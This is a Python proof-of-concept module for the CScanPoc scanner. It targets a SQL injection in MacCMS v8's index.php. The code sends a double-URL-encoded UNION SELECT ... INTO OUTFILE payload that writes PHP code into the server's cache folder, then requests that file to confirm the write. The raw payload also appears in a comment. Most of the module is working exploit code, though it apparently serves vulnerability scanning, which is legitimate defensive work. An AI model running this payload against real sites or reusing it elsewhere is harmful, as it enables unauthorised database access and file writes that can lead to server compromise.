# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MacCMS_0011_p'  # 平台漏洞编号，留空
    name = 'MacCMS v8 设计逻辑缺陷导致sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-07-21'  # 漏洞公布时间
    desc = '''
        MacCMS V8版本中index.php中 be函数 参数未经过过滤带入SQL语句，导致SQL注入漏洞发生。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1874/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    product = 'MacCMS'  # 漏洞应用名称
    product_version = 'v8'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5367f141-695d-459d-b9ba-0c2e1305d22b'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://192.168.10.70/maccms8_mfb_/maccms8_mfb/index.php?m=gbook-show-wd-ss11s') union select 1,2,3,user(),version(),"<?php phpinfo()?>",NULL,NULL,NULL into outfile 'E:/wamp/www/maccms8_mfb_/maccms8_mfb/cache/userinfo'#ORDER BY g_time desc limit 0,10
            # 根据上面的分析，我们对m后面的参数进行两次url编码：
            # payload根据实际环境会有所不同
            payload = "/maccms8_mfb_/maccms8_mfb/index.php"
            data = "?m=gbook-show-wd-ss11s%2527%2529%2520union%2520select%25201%252C2%252C3%252Cuser%2528%2529%252Cmd5%2528c%2529%252C%2522%253C%253Fphp%2520phpinfo%2528%2529%253F%253E%2522%252CNULL%252CNULL%252CNULL%2520into%2520outfile%2520%2527E%253A%252fwamp%252fwww%252fmaccms8_mfb_%252fmaccms8_mfb%252fcache%252fuserinfo%2527%2523ORDER%2520BY%2520g_time%2520desc%2520limit%25200%252C10"
            requests.get(self.target + payload + data)

            verify_url = self.target + '/maccms8_mfb_/maccms8_mfb/cache/userinfo'
            r = requests.get(verify_url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
